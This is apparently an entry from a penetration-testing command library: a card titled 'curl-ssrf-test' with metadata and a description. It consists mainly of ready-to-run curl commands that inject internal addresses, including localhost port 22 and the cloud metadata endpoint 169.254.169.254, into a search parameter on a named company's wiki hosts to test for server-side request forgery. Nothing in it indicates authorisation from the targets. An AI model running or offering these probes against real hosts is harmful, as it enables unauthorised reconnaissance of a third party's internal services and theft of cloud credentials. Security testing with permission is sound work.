---
data: >-
  curl -X GET
  "https://infawiki.informatica.com/search?query=http://127.0.0.1:22" -v
tags:
  - ssrf
  - web
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: f50df1a9-6a04-43d4-98f8-678c862e781c
created_at: '2025-12-14T04:39:09.934Z'
updated_at: '2025-12-14T04:39:09.934Z'
verified: false
validated: true
submitted: true
---
# curl-ssrf-test

## Command

```bash
curl -X GET "https://infawiki.informatica.com/search?query=http://127.0.0.1:22" -v
```

## Description

This command uses curl to test for SSRF by injecting an internal URL (localhost port 22) into a vulnerable parameter on the target wiki endpoint, observing if the server processes the forged request.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies HTTP GET method | Yes |
| `URL` | Target endpoint with injected internal URL in query param | Yes |
| `-v` | Verbose output to show headers and connection details | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://infawiki.informatica.com/search?query=http://127.0.0.1" -v
```

### Advanced Usage

```bash
curl -X GET "https://infawikitest.informatica.com/search?query=http://169.254.169.254/latest/meta-data/" -H "User-Agent: Mozilla/5.0" -v
```

## Expected Output

Verbose logs showing connection attempts; success indicated by internal response data or errors like 'Connection refused' from the server-side request, rather than client-side rejection.

## Related

- [[Related Procedure]]
